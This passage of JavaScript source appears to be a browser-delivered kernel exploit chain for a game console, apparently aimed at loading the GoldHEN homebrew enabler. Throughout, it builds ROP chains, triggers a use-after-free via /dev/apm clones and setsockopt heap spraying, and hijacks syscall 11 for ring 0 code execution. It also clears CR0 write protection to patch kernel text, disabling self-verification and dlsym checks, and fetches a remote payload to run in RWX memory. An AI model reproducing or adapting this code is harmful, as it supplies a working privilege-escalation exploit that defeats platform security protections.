      + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
      + "20c0480d000001000f22c031c0c3";

    const PATCHES = [
      [0x0000acd, "eb",       "bcopy"],
      [0x02bd79d, "eb",       "bzero"],
      [0x02bd7e1, "eb",       "pagezero"],
      [0x02bd85d, "eb",       "memcpy"],
      [0x02bd8a1, "eb",       "pagecopy"],
      [0x02bda4d, "eb",       "copyin"],
      [0x02bdefd, "eb",       "copyinstr"],
      [0x02bdfcd, "eb",       "copystr"],
      [0x01b7a43, "eb04",     "dlsym, first check"],
      [0x01b7a53, "eb04",     "dlsym, second check"],
      [0x01b7a73, "90e9",     "dlsym, nop and jump"],
      [0x01b7504, "90e9",     "load_prx"],
      [0x01b7ab8, "90e93c01", "dlsym, open it to every caller"],
      [0x0628684, "eb00",     "self verification"],
      [0x0628f6f, "eb00",     "delayed panic on suspend"],
    ];

    /* ------------------------------------------------------------- the host */

    const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false };

    function host() {
      if (!STATE.ctx) throw new Error("afterglow: no host installed");
      return STATE.ctx;
    }

    function say(fmt) { host().mark("AG", fmt); }

    const LOW = 0x100000000;

    function v(low, hi) { return new int64(low >>> 0, (hi || 0) >>> 0); }
    function plus(a, n) { return n < 0 ? a.sub32(-n) : a.add32(n); }
    function same(a, b) { return !!b && a.low === b.low && a.hi === b.hi; }
    function inText(a) { return a.hi >= 0xffffff00 && a.low !== 0; }
    function inHeap(a) { return a.hi >= 0xffff0000 && a.hi < 0xffffff00 && a.low !== 0; }
    function text(a) { return "0x" + a.toString(16).padStart(16, "0"); }

    /* The host resolves a syscall number to a libkernel stub and only ever
       scanned for its own two dozen. Ours -- open, mprotect, kqueue, kevent,
       ioctl, the dynlib pair -- are not among them, and an unresolved number
       reaches its argument marshalling as undefined. So we scan for the rest
       ourselves, with the same shape it looks for:

           48 c7 c0 <nr32>   49 89 ca   0f 05

       One pass for everything missing, not one pass per number. */
    function seedStubs() {
      const c = host();
      const need = new Set();
      for (const k in S) {
        const n = S[k];
        if (!(c.stubAddr && c.stubAddr.has(n)) && !STATE.stubs[n]) need.add(n);
      }
      if (!need.size) return [];

      const base = c.libkernelBase;
      if (!base) return Array.from(need);

      const limit = (c.off && c.off.k_scan_stage1) || 0x200000;
      for (let o = 0; o < limit && need.size; o += 16) {
        const q = c.p.read8(base.add32(o));
        if ((q.low & 0x00ffffff) !== 0xc0c748 || (q.hi >>> 24) !== 0x49) continue;
        const n = ((q.low >>> 24) | ((q.hi & 0x00ffffff) << 8)) >>> 0;
        if (!need.has(n)) continue;
        STATE.stubs[n] = base.add32(o);
        need.delete(n);
      }
      return Array.from(need);
    }

    function stubFor(num) {
      const c = host();
      if (STATE.stubs[num]) return STATE.stubs[num];
      if (c.stubAddr && c.stubAddr.has(num)) return c.stubAddr.get(num);
      return null;
    }

    function sc(num) {
      const a = Array.prototype.slice.call(arguments, 1);
      const t = stubFor(num);
      if (!t) throw new Error("afterglow: no libkernel stub for syscall " + num);
      return host().callAddr(t, a);
    }

    function alloc(size) {
      const c = host();
      const ab = new ArrayBuffer(size);
      const u8 = new Uint8Array(ab);
      const dv = new DataView(ab);
      c.keepAlive.push(ab, u8, dv);
      return { ab: ab, u8: u8, dv: dv, at: c.bufAddr(ab) };
    }

    function rd4(at) { return host().p.read4(at) >>> 0; }
    function rd8(at) { const r = host().p.read8(at); return v(r.low, r.hi); }
    function wr1(at, b) { host().p.write1(at, b & 0xff); }
    function wr4(at, n) { host().p.write4(at, n >>> 0); }
    function wr8(at, q) { host().p.write8(at, q); }

    /* p carries read1/2/4/8 and write1/2/4/8 and nothing bulk, so this walks it
       a quadword at a time and picks up the remainder by byte. */
    function rdbuf(at, len) {
      const out = new Uint8Array(len);
      const pr = host().p;
      let i = 0;
      while (i + 8 <= len) {
        const q = pr.read8(plus(at, i));
        let lo = q.low >>> 0, hi = q.hi >>> 0;
        for (let k = 0; k < 4; k++) { out[i + k] = lo & 0xff; lo = lo >>> 8; }
        for (let k = 0; k < 4; k++) { out[i + 4 + k] = hi & 0xff; hi = hi >>> 8; }
        i += 8;
      }
      while (i < len) { out[i] = pr.read1(plus(at, i)) & 0xff; i++; }
      return out;
    }

    function wrbuf(at, bytes) {
      for (let i = 0; i < bytes.length; i++) wr1(plus(at, i), bytes[i]);
    }

    function unhex(s) {
      const out = new Uint8Array(s.length / 2);
      for (let i = 0; i < out.length; i++) out[i] = parseInt(s.substr(i * 2, 2), 16);
      return out;
    }

    function sameBytes(a, b) {
      if (a.length !== b.length) return false;
      for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
      return true;
    }

    /* 64 bit quantity into a buffer, and back */
    function pokeAt(buf, off, q) {
      buf.dv.setUint32(off, q.low >>> 0, true);
      buf.dv.setUint32(off + 4, q.hi >>> 0, true);
    }


    function wipe(buf, len) { buf.u8.fill(0, 0, len); }

    function cstr(s) {
      const b = alloc(s.length + 8);
      for (let i = 0; i < s.length; i++) b.u8[i] = s.charCodeAt(i);
      b.u8[s.length] = 0;
      return b;
    }

    function splitNum(n) { return v(n % LOW, Math.floor(n / LOW)); }
    function asQ(x) { return (typeof x === "number") ? splitNum(x) : x; }

    /* ------------------------------------------------- machine code pad */

    function codeAt(pageAt, off) {
      return {
        at: plus(pageAt, off),
        n: 0,
        reset: function () { this.n = 0; return this; },
        byte: function (b) { wr1(plus(this.at, this.n), b); this.n++; return this; },
        hex: function (s) {
          const b = unhex(s);
          for (let i = 0; i < b.length; i++) this.byte(b[i]);
          return this;
        },
        dw: function (n) {
          for (let k = 0; k < 4; k++) this.byte(Math.floor(n / Math.pow(256, k)) % 256);
          return this;
        },
        qw: function (q) { return this.dw(q.low >>> 0).dw(q.hi >>> 0); },
        imm: function (bytes) {
          for (let i = 0; i < bytes.length; i++) this.byte(bytes[i]);
          return this;
        },
      };
    }

    /* ------------------------------------------------------- rop chain */

    function makeChain(buf, gad) {
      return {
        buf: buf, base: buf.at, n: 0, fix: [], g: gad,

        slot: function (q) { pokeAt(this.buf, this.n * 8, asQ(q)); this.n++; return this.n - 1; },
        num: function (n) { return this.slot(asQ(n)); },
        hole: function () { return this.slot(v(0, 0)); },
        where: function (i) { return plus(this.base, i * 8); },
        gad: function (name) { return this.slot(this.g[name]); },
        point: function (hole, target) { this.fix.push([hole, target]); },

        seal: function () {
          for (let i = 0; i < this.fix.length; i++) {
            pokeAt(this.buf, this.fix[i][0] * 8, this.where(this.fix[i][1]));
          }
          this.gad("leave");
        },

        rdi: function (n) { this.gad("rdi"); return this.num(n); },
        rsi: function (n) { this.gad("rsi"); return this.num(n); },
        rdx: function (n) { this.gad("rdx"); return this.num(n); },

        /* rax <- *(rax + off), through the one deref gadget there is */
        follow: function (off) {
          const d = off - 8;
          if (d >= 0) { this.rdi(d); this.gad("add"); } else { this.rdi(-d); this.gad("sub"); }
          this.gad("load8");
        },

        save_rax: function (at) { this.rdi(at); this.gad("store"); },
        load_rax: function (at) { this.rdi(at); this.gad("load"); },

        /* copy len bytes from wherever rax points to dst, and report the slot
           that ends up holding the source address */
        grab: function (dst, len) {
          this.gad("rdi"); const h = this.hole();
          this.gad("store");
          this.gad("rsi"); const s = this.hole();
          this.point(h, s);
          this.rdx(len); this.rdi(dst); this.gad("memcpy");
          return s;
        },

        put: function (dst, src, len) {
          this.gad("rdi"); this.slot(dst);
          this.rsi(src); this.rdx(len); this.gad("memcpy");
        },
      };
    }

    /* ----------------------------------------------------------- a shot */

    /* One attempt at the bug. Each takes a unit nobody used before: a unit an
       earlier attempt touched still carries a note from that attempt's queue, and
       freeing its clone again would leave a foreign queue pointing at dead
       memory. */
    function shooter(gad) {
      const s = {
        g: gad, fired: 0, sprayed: 0, devs: [], queues: [],
        sockaddr: alloc(16),
      };
      const bs = [16, 2, 0x04, 0xD2, 0x0a, 0, 0, 1];
      for (let i = 0; i < bs.length; i++) s.sockaddr.u8[i] = bs[i];

      s.hold = function (path) {
        const fd = sc(S.open, cstr(path).at, 0).i32;
        if (fd >= 0) this.devs.push(fd);
        return fd;
      };

      s.take = function (build, room) {
        /* four ways to come back empty, and telling them apart matters: one is a
           spent budget, one is a refused open, one is a kernel that would not
           arm. They used to be one silent null. */
        this.why = null;
        if (this.hold("/dev/apm") < 0) {
          this.why = "the clone node refused to open, errno " + host().errno();
          return null;
        }

        /* The ceiling used to be TUNE.units. By the second shot this process is
           already holding some fifty clones of its own, so the free numbers sit
           above that -- and a search that stops at fifteen finds nothing while
           reporting "no unused unit", which is true and useless. Look further,
           and write down why the refusals came. */
        let unit = -1, watched = -1;
        const refused = [];
        for (let u = TUNE.ceiling; u >= 0; u--) {
          if (STATE.units[u]) continue;
          const fd = this.hold("/dev/apm" + u);
          if (fd >= 0) { unit = u; watched = fd; break; }
          if (refused.length < 4) refused.push(u + ":e" + host().errno());
        }
        if (unit < 0) {
          this.why = "no apm unit among 0.." + TUNE.ceiling
                     + " (" + Object.keys(STATE.units).length + " spent, refusals "
                     + refused.join(" ") + ")";
          return null;
        }
        STATE.units[unit] = true;
        this.fired++;

        const doomed = sc(S.open, cstr("/dev/apm" + unit).at, 0).i32;
        if (doomed < 0) {
          this.why = "second open of /dev/apm" + unit + " refused, errno " + host().errno();
          return null;
        }

        const q = sc(S.kqueue).i32;
        this.queues.push(q);
        const ev = alloc(32);
        const arm = function () {
          ev.dv.setUint32(0, watched >>> 0, true);
          ev.dv.setUint32(4, 0, true);
          ev.dv.setUint16(8, 0xFFFF, true);
          ev.dv.setUint16(10, 0x0001, true);
          ev.dv.setUint32(12, 0, true);
          ev.u8.fill(0, 16, 32);
          return sc(S.kevent, q, ev.at, 1, 0, 0, 0).i32;
        };
        const armed = arm();
        if (armed !== 0) {
          this.why = "kevent would not arm on unit " + unit + ", rv=" + armed
                     + " errno " + host().errno();
          return null;
        }

        /* Everything that is not a 128 byte allocation happens before the free.
           Anything in between lets a foreign consumer take the hole first. */
        const rop = alloc(room || 0x400);
        const frame = alloc(0x100);
        wipe(frame, 0x100);
        const c = makeChain(rop, this.g);
        c.num(0);                      /* swallowed by the pop in the pivot gadget */
        build(c);
        c.seal();
        pokeAt(frame, 0x38, rop.at);

        const body = alloc(TUNE.object);
        wipe(body, TUNE.object);
        pokeAt(body, 0x38, this.g.pivot);
        pokeAt(body, 0x58, frame.at);

        const req = alloc(40);
        req.dv.setUint32(0, 1, true);
        req.dv.setUint32(4, 0, true);
        pokeAt(req, 8, this.sockaddr.at);
        req.dv.setUint32(16, 16, true);
        pokeAt(req, 24, body.at);
        req.dv.setUint32(32, TUNE.object, true);

        /* The original tapered this to TUNE.spare once sixty clones were out --
           a saving that suits a quiet game process. Here the three failures that
           reached this far all sat on a shot that had seeded eight. Seeding
           happens before the free, so it costs nothing in the window that
           decides the outcome. */
        const want = TUNE.seed;
        for (let i = 0; i < want; i++) {
          if (this.hold("/dev/apm") < 0) break;
          STATE.clones++;
        }

        const socks = [];
        for (let i = 0; i < TUNE.sprays; i++) {
          const fd = sc(S.socket, 2, 2, 0).i32;
          if (fd < 0) break;
          socks.push(fd);
        }

        /* The window: from the free to the last spray. In the Lua host each of
           these is a cheap syscall; here every one is a ROP call -- lay out a
           stack, bend a pivot cell, trip Math.expm1, put the cell back. Nothing
           may be printed inside it, so the number is only reported afterwards. */
        const hh = host();
        const stub = stubFor(S.setsockopt);
        /* One entry per batch instead of one per socket. Measured at 119 us an
           entry, 126 of them hold the hole open for 15 ms; the Lua host does the
           same work in well under one. Batches are sized to the host's rop stack
           (0x2000) -- twelve slots a call, and room for the epilogue. */
        /* How many fit in one entry is a property of the host's rop stack, not
           of this console's speed -- a slower machine wants the same answer, just
           fewer entries would help it more. The stack size is the host's own
           constant, so ask instead of assuming: build the largest batch it
           accepts, once, outside the window. */
        if (STATE.batch === undefined && hh.prepareMany && stub) {
          STATE.batch = 0;
          for (let n = TUNE.sprays; n >= 8; n = Math.floor(n * 3 / 4)) {
            try {
              const probeCalls = [];
              for (let i = 0; i < n; i++) probeCalls.push([stub, [0, 17, 128, req.at, 40]]);
              hh.prepareMany(probeCalls);
              STATE.batch = n; break;
            } catch (e) { /* too big for its stack, try smaller */ }
          }
          say("    rop stack takes " + STATE.batch + " calls per entry");
        }
        const batch = (hh.prepareMany && hh.runPrepared && stub) ? (STATE.batch || 0) : 0;
        const fertig = [];
        if (batch) {
          const calls = [];
          for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
          for (let i = 0; i < calls.length; i += batch) {
            fertig.push(hh.prepareMany(calls.slice(i, i + batch)));
          }
          /* warm the path: the first entry of a run paid 19 ms where the rest
             paid 4, and that difference has no business being inside the window */
          hh.runPrepared(hh.prepareMany([[stubFor(S.getuid), []]]));
        }

        const t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
        sc(S.close, doomed);
        if (batch) {
          for (let i = 0; i < fertig.length; i++) hh.runPrepared(fertig[i]);
        } else {
          for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
        }
        const t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
        this.window = t1 - t0;
        this.batched = batch;
        /* should the hole have stayed empty, a fresh clone drops a real pointer
           in, which makes the second arm() merely useless instead of fatal */
        for (let i = 0; i < TUNE.spare; i++) this.hold("/dev/apm");

        this.sprayed = socks.length;
        const r = arm();
        for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
        say("    window " + this.window.toFixed(2) + " ms for " + socks.length
            + " setsockopt in " + (this.batched ? fertig.length : socks.length) + " entries");
        return r;
      };

      return s;
    }

    function ran(r) { return r !== null && r === -1; }

    function qAt(buf, off) {
      return v(buf.dv.getUint32(off, true), buf.dv.getUint32(off + 4, true));
    }

    /* ----------------------------------------- ring 0 through syscall 11 */

    /* The bootstrap pointed sysent[11] at a planted `jmp [rsi]`. sy_call is
       entered with rdi = thread and rsi = the argument vector, so the jump lands
       on whatever address the first argument carries.

       The original issues this with the loader's native call. A host whose
       syscall primitive takes an arbitrary number could call syscall 11 straight;
       raw13's sc() goes through a per-number stub table that has no entry for 11,
       so the two byte userland stub stays and is entered with callAddr. */
    const GATE = 0x0a0, BODY = 0x0c0, OUT = 0x400, FLAG = 0x420, STAGE = 0x440;
    const STAGE_MAX = 0x400;
    const SIGIL = 0x600D600D;

    function openRing0(roomAt) {
      const r = { at: roomAt, body: codeAt(roomAt, BODY) };
      codeAt(roomAt, GATE).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");

      r.begin = function () { return this.body.reset(); };

      /* the gate returns the thread's value, not ours, so the body raises a flag
         of its own as its very last act and that is what we test */
      r.run = function () {
        this.body.hex("48b8").qw(plus(this.at, FLAG)).hex("c700").dw(SIGIL).hex("31c0").hex("c3");
        wr4(plus(this.at, FLAG), 0);
        host().callAddr(plus(this.at, GATE), [11, plus(this.at, BODY)]);
        return (rd4(plus(this.at, FLAG)) >>> 0) === (SIGIL >>> 0);
      };

      r.out = function () { return rd8(plus(this.at, OUT)); };

      r.thread = function () {
        this.begin().hex("48ba").qw(plus(this.at, OUT)).hex("48893a");
        return this.run() ? this.out() : null;
      };

      r.base = function () {
        const c = this.begin();
        c.hex("b9").dw(0xc0000082).hex("0f32");
        c.hex("48c1e220").hex("89c0").hex("4809c2");
        c.hex("48b8").qw(plus(this.at, OUT)).hex("488910");
        return this.run() ? plus(this.out(), -448) : null;
      };

      /* rep movsb inside the write protection bracket, so the same primitive
         serves kernel data and kernel text. Only writes need the bracket, and
         every clear of it is a window in which this thread must not be
         interrupted -- so reads do not open one. */
      r.copy = function (dst, src, len, guarded) {
        const c = this.begin();
        if (guarded) c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
        c.hex("48bf").qw(dst);
        c.hex("48be").qw(src);
        c.hex("48b9").qw(splitNum(len));
        c.hex("fc").hex("f3a4");
        if (guarded) c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
        return this.run();
      };

      /* All of them in one entry, with the write protection lifted once. Several
         of these sit in the hottest routines in the kernel and the other cores
         keep running them; a patch written in its own call is a window in which
         one of them can fetch a half written instruction. */
      r.apply = function (base, list) {
        const c = this.begin();
        c.hex("48b9").qw(base);
        c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
        for (let i = 0; i < list.length; i++) {
          const bytes = unhex(list[i][1]);
          if (bytes.length === 1) c.hex("c681");
          else if (bytes.length === 2) c.hex("66c781");
          else c.hex("c781");
          c.dw(list[i][0]).imm(bytes);
        }
        c.hex("0f20c0").hex("480d").dw(0x00010000).hex("0f22c0");
        return this.run();
      };

      r.read = function (at, len) {
        len = len || 8;
        if (!this.copy(plus(this.at, STAGE), at, len, false)) return null;
        return rdbuf(plus(this.at, STAGE), len);
      };

      r.read_v = function (at) {
        const s = this.read(at, 8);
        if (!s) return null;
        let lo = 0, hi = 0;
        for (let i = 3; i >= 0; i--) lo = lo * 256 + s[i];
        for (let i = 7; i >= 4; i--) hi = hi * 256 + s[i];
        return v(lo, hi);
      };

      r.write = function (at, bytes) {
        wrbuf(plus(this.at, STAGE), bytes);
        return this.copy(at, plus(this.at, STAGE), bytes.length, true);
      };

      r.write_v = function (at, q) {
        const b = new Uint8Array(8);
        let lo = q.low >>> 0, hi = q.hi >>> 0;
        for (let i = 0; i < 4; i++) { b[i] = lo % 256; lo = Math.floor(lo / 256); }
        for (let i = 4; i < 8; i++) { b[i] = hi % 256; hi = Math.floor(hi / 256); }
        return this.write(at, b);
      };

      return r;
    }

    /* ------------------------------------------------------ the host's state */

    function isZero(q) { return !q || ((q.low >>> 0) === 0 && (q.hi >>> 0) === 0); }

    /* dynlib_get_info fills the name in this sandbox and nothing else -- no
       segment array, so no base. The mappings carry their own path, so ask the
       kernel for the map instead. No blind reads, and it hands over the bounds
       of the module as well, which the host page check wants anyway. */
    /* The mappings carry no path here, so identity has to come from content. We
       already know fifteen byte patterns at fixed offsets inside this module --
       that is a far stronger fingerprint than a name. The map supplies the
       bounds, so every read lands inside a mapping that exists, and only
       mappings long enough to hold the whole span are touched. */
    /* The kernel walks its vm_map entries in address order and so does this
       listing, so an index here is the same index there. Kept, because the chain
       that walks the kernel side has to be told how far to go -- and going four
       times further than necessary is four times the ring 0 work on a hijacked
       stack. */
    let MAPS = null;

    function findLibByShape() {
      const r = { base: null, entries: 0, big: 0, first: [], note: null };
      MAPS = [];
      const pid = sc(S.getpid).i32;
      const mib = alloc(16);
      mib.dv.setInt32(0, 1, true); mib.dv.setInt32(4, 14, true);
      mib.dv.setInt32(8, 32, true); mib.dv.setInt32(12, pid, true);
      const len = alloc(8);
      len.dv.setUint32(0, 0, true); len.dv.setUint32(4, 0, true);
      let rv = sc(S.sysctl, mib.at, 4, 0, len.at, 0, 0).i32;
      let need = len.dv.getUint32(0, true);
      if (rv !== 0 || !need) { r.note = "vmmap sizing rv=" + rv; return r; }
      const buf = alloc(need + 0x8000);
      len.dv.setUint32(0, need + 0x8000, true); len.dv.setUint32(4, 0, true);
      rv = sc(S.sysctl, mib.at, 4, buf.at, len.at, 0, 0).i32;
      const used = Math.min(len.dv.getUint32(0, true), buf.u8.length);
      if (rv !== 0 || !used) { r.note = "vmmap read rv=" + rv; return r; }

      const span = HOST.last;                     /* everything we ever touch */
      const cand = [];
      let off = 0;
      while (off + 8 <= used) {
        const size = buf.dv.getInt32(off, true);
        if (size <= 0 || off + size > used) break;
        r.entries++;
        const start = qAt(buf, off + 8), stop = qAt(buf, off + 16);
        MAPS.push([start, stop]);
        if (r.first.length < 4) r.first.push(text(start) + "-" + text(stop));
        const bytes = (stop.hi - start.hi) * LOW + (stop.low - start.low);
        if (start.hi > 0 && (start.low & 0x3fff) === 0 && bytes >= span) {
          cand.push(start); r.big++;
        }
        off += size;
      }

      /* two patterns, far apart, is already beyond coincidence */
      const probes = [GADGETS.pivot, GADGETS.memcpy];
      for (let i = 0; i < cand.length; i++) {
        let all = true;
        for (let k = 0; k < probes.length && all; k++) {
          const want = unhex(probes[k][1]);
          if (!sameBytes(rdbuf(plus(cand[i], probes[k][0]), want.length), want)) all = false;
        }
        if (all) { r.base = cand[i]; return r; }
      }
      r.note = "no mapping carries the gadget shape (" + r.big + " of " + r.entries + " long enough)";
      return r;
    }

    /* Reports instead of returning a bare value: when this comes back empty the
       caller has to know whether the listing failed, the module was absent, or it
       was there with a zero base -- those need different answers, and a zero
       int64 is truthy, which is how a zero base once reached a read as a bare
       gadget offset. */
    function findLib(name) {
      const r = { base: null, rv: null, count: 0, seen: [], note: null };
      const list = alloc(4 * 0x300), count = alloc(8);
      count.dv.setUint32(0, 0, true); count.dv.setUint32(4, 0, true);
      r.rv = sc(S.dynlib_get_list, list.at, 0x300, count.at).i32;
      r.count = count.dv.getUint32(0, true);
      if (r.rv !== 0) { r.note = "dynlib_get_list rv=" + r.rv; return r; }
      if (!r.count) { r.note = "the module list came back empty"; return r; }

      const info = alloc(0x160);
      for (let i = 0; i < r.count; i++) {
        info.u8.fill(0);
        info.dv.setUint32(0, 0x160, true);
        const rv = sc(S.dynlib_get_info, list.dv.getUint32(i * 4, true), info.at).i32;
        if (rv !== 0) continue;
        let nm = "";
        for (let k = 8; k < 0x100 && info.u8[k] !== 0; k++) nm += String.fromCharCode(info.u8[k]);
        if (r.seen.length < 6) r.seen.push(nm);
        if (nm === name) {
          let b = qAt(info, 0x108);
          if (!isZero(b)) { r.base = b; r.at = "0x108"; return r; }
          /* The segment array does not sit where it does in a game process. Let
             the struct say where it is instead of guessing: a module base is a
             userland address on the 16 KiB grid, and there are very few of those
             in 0x160 bytes. */
          const cand = [];
          for (let o = 8; o + 8 <= 0x160; o += 8) {
            const q = qAt(info, o);
            if (isZero(q)) continue;
            if (q.hi > 0x40) continue;
            if ((q.low & 0x3fff) !== 0) continue;
            cand.push("+0x" + o.toString(16) + "=" + text(q));
            if (r.base === null) { r.base = q; r.at = "+0x" + o.toString(16); }
          }
          r.note = cand.length
            ? ("base not at +0x108; grid aligned candidates: " + cand.join(" "))
            : "found " + name + " but no plausible base anywhere in the info struct";
          return r;
        }
      }
      r.note = name + " is not among the " + r.count + " modules";
      return r;
    }

    /* Which core we may run on is not ours to choose: this process is confined
       to a subset, and in a browser that subset does not contain core 0. Setting
       bit 0 regardless fails, the thread stays free to migrate, and then the free
       and the refill land in different per cpu buckets -- the hole is filled by
       somebody else and the pivot takes its stack pointer from a stranger. So ask
       first, then pin to the lowest core actually allowed. */
    function pinCore() {
      const mask = alloc(16);
      mask.u8.fill(0);
      let rv = sc(S.cpuset_getaffinity, 3, 1, -1, 16, mask.at).i32;
      if (rv !== 0) return { ok: false, note: "getaffinity rv=" + rv };

      let core = -1, allowed = [];
      for (let b = 0; b < 128; b++) {
        if ((mask.u8[b >> 3] >> (b & 7)) & 1) { if (core < 0) core = b; allowed.push(b); }
      }
      if (core < 0) return { ok: false, note: "no core in the mask" };

      mask.u8.fill(0);
      mask.u8[core >> 3] = 1 << (core & 7);
      rv = sc(S.cpuset_setaffinity, 3, 1, -1, 16, mask.at).i32;
      return { ok: rv === 0, core: core, allowed: allowed.join(","), note: "setaffinity rv=" + rv };
    }

    /* ------------------------------------------------------- the payload */

    /* A homebrew enabler is a raw blob that starts with a jmp, not an ELF. It
       goes into a page that is executable only because the kernel patch opened
       rwx, and it runs on its own thread so this one stays free. pthread_create
       is taken out of WebKit's import table and checked against libkernel before
       it is called -- a wrong pointer here runs the payload nowhere.

       Must come after the handles are defused: the enabler can restart SceShellUI,
       and if this process is torn down with the handles still live, that is the
       hang. */
    /* Fetch a file once. Both loaders are handed the bytes, so deciding the
       format does not cost a second request. */
    async function fetchBytes(url, tag) {
      try {
        const r = await fetch(url);
        if (!r.ok) { say("[" + tag + "] " + url + " HTTP " + r.status); return null; }
        return new Uint8Array(await r.arrayBuffer());
      } catch (e) {
        say("[" + tag + "] " + url + " unreachable: " + (e && e.message));
        return null;
      }
    }

    /* Which loader runs is decided by the CONTENT, not by the file name. There
       are two forms and they look alike from outside:
         - composite image: stub area plus payload at 0x50000, exactly
           nlOff+nlLen bytes. Needs the patch chain, the trampoline and the
           padding RW.
         - raw payload: begins with `e9` (jmp rel32), like hen.bin. Mapped and
           started as a thread.
       A GoldHEN build of 297,496 bytes is the second form; going by its name it
       would have taken the composite path and been rejected by the length
       check. */

    /* The 641 byte kernel patch set. It belongs to GOLDHEN, not to the composite
       image: afterglow's own fifteen patches cover 25 of the 51 write sites, and
       the thirty that are missing -- one block around 0x125791 and three singles
       -- are exactly what GoldHEN's own code expects to find.

       It runs for both image forms. A raw payload that started without it brought
       GoldHEN up (FTP answered) but left it running without its patches. */
    async function runPatchSet(room) {
      const c = host();
      let pset = null;
      try {
        pset = __getEmbeddedPatch("1400.bin");
      } catch (e) {}
      if (!pset || !pset.length) {
        say("[g] embedded 1400.bin patch data is unavailable -- refusing an incomplete GoldHEN load");
        return false;
      }
      if (pset.length > 0x400 - 0xc0) {
        say("[g] the patch set does not fit in the body area");
        return false;
      }
      wrbuf(plus(room, 0xc0), pset);
      const pr = c.callAddr(plus(room, GATE), [11, plus(room, 0xc0)]);
      say("[g] [0] kernel patch set, " + pset.length + " bytes from the libc tail -> 0x"
          + ((pr && pr.lo >>> 0) || 0).toString(16));
      return true;
    }

    async function loadEnabler(url, k, kbase, room) {
      const blob = await fetchBytes(url, "e");
      if (blob === null) return false;
      if (blob.length === GH.nlOff + GH.nlLen) {
        say("[e] " + blob.length + " bytes -- composite image, patch chain path");
        return loadGoldhen(url, k, kbase, room, blob);
      }
      if (blob.length && blob[0] === 0xe9) {
        say("[e] " + blob.length + " bytes, leading jmp -- raw payload path");
        // Here too: GoldHEN expects to find its patches in place.
        if (!(await runPatchSet(room))) return false;
        return loadPayload(url, blob);
      }
      say("[e] " + blob.length + " bytes: neither the composite image ("
          + (GH.nlOff + GH.nlLen) + ") nor a raw payload (leading jmp) -- refusing");
      return false;
    }

    async function loadPayload(url, vorab) {
      const c = host();
      let blob = vorab || null;
      if (blob === null) {
        blob = await fetchBytes(url, "p");
        if (blob === null) return false;
      }

      if (!blob.length) { say("[p] " + url + " is empty"); return false; }
      if (blob[0] !== 0xe9) {
        say("[p] " + url + " does not start with a jmp -- not a raw payload, refusing");
        return false;
      }

      const size = (blob.length + 0x3fff) & -16384;
      const m = sc(S.mmap, 0, size, 7, 0x1002, -1, 0);
      const entry = v(m.lo, m.hi);
      if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
        say("[p] mmap rwx failed, errno " + c.errno()); return false;
      }

      for (let o = 0; o < blob.length; o += 8) {
        let lo = 0, hi = 0;
        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
        c.p.write8(plus(entry, o), v(lo >>> 0, hi >>> 0));
      }
      for (let o = 0; o < blob.length; o += 8) {
        let lo = 0, hi = 0;
        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
        const q = c.p.read8(plus(entry, o));
        if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
          say("[p] copy mismatch at 0x" + o.toString(16)); return false;
        }
      }

      /* The table blanks both pthread_create fields for this firmware, but only
         one of them deserved it: the import slot is a WebKit offset and this
         build's WebKit is the 13.52 one, while k_pthread_create is a libkernel
         offset and libkernel did move. The second was only ever used to check the
         first, so check it against libkernel's own bounds instead -- a slot that
         resolves into libkernel is the right slot, whatever the table says. */
      const SLOT_1352 = 0x3cb9c00;
      const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
        ? c.off.wk___imp_pthread_create : SLOT_1352;
      if (!c.webkitBase || !c.libkernelBase) {
        say("[p] no module bases -- payload sits loaded at " + text(entry) + ", not started");
        return false;
      }
      const fnr = c.p.read8(c.webkitBase.add32(slot));
      const fn = v(fnr.low, fnr.hi);
      const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
      if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
        say("[p] slot +0x" + slot.toString(16) + " holds " + text(fn)
            + ", not inside libkernel " + text(c.libkernelBase) + " -- not calling it");
        return false;
      }
      say("[p] pthread_create at " + text(fn) + " = libkernel +0x" + d.toString(16));

      const thr = alloc(8);
      thr.u8.fill(0);
      const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
      const handle = qAt(thr, 0);
      const started = rc === 0 && (handle.hi >>> 0) > 0;
      say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc
          + (started ? " -- running" : " -- did NOT start"));
      return started;
    }

    /* ------------------------------------------------------- GoldHEN */

    /* This image is not a payload in the sense hen.bin is. The first 0x50000
       bytes are a stub area -- a gate at 0x47c00, a trampoline at 0x47c40, a
       marker pair at 0x47e80 -- and the GoldHEN payload proper sits at 0x50000
       and is 636760 bytes, which together is exactly the file's length. The
       payload is not run in userland at all: it is copied into the kernel's text
       padding and main's chain is then driven one call at a time through
       syscall 11, so that a call which does not come back can be named instead
       of guessed. This follows the step order established in the Lua work.

       The buffer must be a fresh mmap, not an allocator's: a calloc buffer is
       not executable throughout -- measured, one page in eighteen -- and a ring 0
       jump into a page without the bit is a panic without a signal. A fresh
       mapping is executable throughout once the kernel patch is in. */
    const GH = {
      tor: 0x47c00, tram: 0x47c40, mark: 0x47e80, kptr: 0x47b20,
      nlOff: 0x50000, nlLen: 636760,
      rvaPad: 0xb3c000, rvaKmem: 0x466540,
    };

    const GH_STEPS = [
